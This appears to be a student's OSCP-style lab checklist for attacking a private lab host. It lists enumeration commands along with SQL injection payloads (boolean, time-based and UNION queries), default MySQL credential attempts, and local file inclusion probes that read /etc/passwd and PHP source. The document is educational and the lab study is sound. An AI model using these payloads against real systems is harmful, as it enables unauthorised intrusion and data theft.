# Investigation Checklist - Chapter 10 Capstone 2
## Target: 192.168.145.48
## Current Known Services:
- **Port 22**: OpenSSH 7.9p1 Debian
- **Port 80**: Nginx 1.14.2 (PHP application)
- **Port 3306**: MySQL (unauthorized)
- **Port 33060**: MySQL X Protocol

---

## 🎯 Priority Attack Vectors

### 1. Web Application Deep Dive [HIGH PRIORITY]
**Current State**: Basic enumeration complete (3 PHP files found)

#### Manual Parameter Discovery:
```bash
# Step 1: Manually inspect each page for forms
curl -s http://192.168.145.48/index.php | grep -Eo '<form[^>]*>' -A 20
# Look for: action=, method=, input names

# Step 2: Check for GET parameters in links
curl -s http://192.168.145.48/index.php | grep -Eo 'href="[^"]*\?[^"]*"'
# Document ANY parameters found

# Step 3: Inspect JavaScript for AJAX endpoints
curl -s http://192.168.145.48/index.php | grep -Eo '(ajax|fetch|XMLHttpRequest|\.post|\.get)'
```

#### Hidden Content Discovery:
```bash
# PHP-specific wordlist with extensions
gobuster dir -u http://192.168.145.48/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,old,zip -t 30
# -x: PHP files might have backup extensions
# Document in: enumeration.md
```

#### Source Code Analysis:
```bash
# Look for comments revealing functionality
curl -s http://192.168.145.48/about.php | grep -E '<!--.*-->'
curl -s http://192.168.145.48/donate.php | grep -E '<!--.*-->'
```

---

### 2. SQL Injection Testing [CRITICAL]
**Why**: PHP + MySQL combo is classic SQLi target

#### Manual SQLi Discovery Method:
```bash
# Step 1: Find ALL input parameters first
# For donate.php (likely has a form):
curl -s http://192.168.145.48/donate.php | grep -Eo 'name="[^"]*"' | cut -d'"' -f2

# Step 2: Basic SQLi test (single quote)
curl "http://192.168.145.48/donate.php?param=' OR '1'='1"
# Look for: MySQL errors, different response length

# Step 3: Time-based blind SQLi test
time curl "http://192.168.145.48/donate.php?param=1' AND SLEEP(5)--+"
# If takes 5+ seconds = vulnerable
```

#### Error-Based SQLi Enumeration:
```bash
# If SQLi found, enumerate manually:
# Database version:
?id=1' UNION SELECT 1,@@version--+

# Current database:
?id=1' UNION SELECT 1,database()--+

# Tables:
?id=1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--+
```

---

### 3. MySQL Direct Attack [MEDIUM]
**Current State**: Shows "unauthorized" but worth testing

#### Default Credentials:
```bash
# Test common MySQL defaults
mysql -h 192.168.145.48 -u root
mysql -h 192.168.145.48 -u root -p    # Try blank password
mysql -h 192.168.145.48 -u admin -padmin

# Document attempts in: failed_attempts.md
```

#### Anonymous Access:
```bash
# Some MySQL allows anonymous connections
mysql -h 192.168.145.48 -u anonymous
mysql -h 192.168.145.48 -u '' -p''
```

---

### 4. File Inclusion Vulnerabilities [HIGH]
**Why**: PHP applications commonly vulnerable

#### LFI Manual Test:
```bash
# Test each PHP file with common LFI parameters
curl "http://192.168.145.48/index.php?page=../../etc/passwd"
curl "http://192.168.145.48/index.php?file=../../etc/passwd"
curl "http://192.168.145.48/index.php?include=../../etc/passwd"
curl "http://192.168.145.48/about.php?page=../../etc/passwd"

# PHP wrapper test (if LFI exists):
curl "http://192.168.145.48/index.php?page=php://filter/convert.base64-encode/resource=index"
```

---

### 5. Upload Functionality Hunt [MEDIUM]
**Look for**: File upload forms (common in donate pages)

```bash
# Check donate.php specifically for upload forms
curl -s http://192.168.145.48/donate.php | grep -i "type=\"file\""
curl -s http://192.168.145.48/donate.php | grep -i "multipart"

# Common upload endpoints
curl -I http://192.168.145.48/upload.php
curl -I http://192.168.145.48/uploads/
```

---

### 6. Version-Specific Vulnerabilities [LOW]

#### Nginx 1.14.2:
```bash
searchsploit nginx 1.14
# Document findings in: vulnerability_research.md
```

#### OpenSSH 7.9p1:
```bash
searchsploit openssh 7.9
# Lower priority - SSH rarely the entry point
```

---

## 🔬 Methodology Reminders

### For Each Finding:
1. **Manual First**: Try to discover without tools
2. **Document Everything**: Including failures
3. **Understand Why**: Don't just run commands
4. **Time It**: Track for exam preparation

### Documentation Files to Create:
- `enumeration.md` - All scan results
- `failed_attempts.md` - What didn't work (LEARN from these!)
- `vulnerability_research.md` - CVE details
- `breakthrough.md` - When you find the entry point
- `exploitation.md` - Step-by-step exploit

---

## Next Immediate Actions:
1. **Deep parameter discovery on donate.php** (most likely to have functionality)
2. **Test for SQLi on any parameters found**
3. **Check for backup files** (.bak, .old, .zip)
4. **Inspect page source for comments/hidden fields**

---

## Time Budget (OSCP Exam Planning):
- Web enumeration: 20-30 minutes
- SQLi testing: 30-45 minutes
- File inclusion: 15 minutes
- MySQL testing: 10 minutes
- Research/documentation: 20 minutes

**Remember**: Document EVERYTHING, especially failures!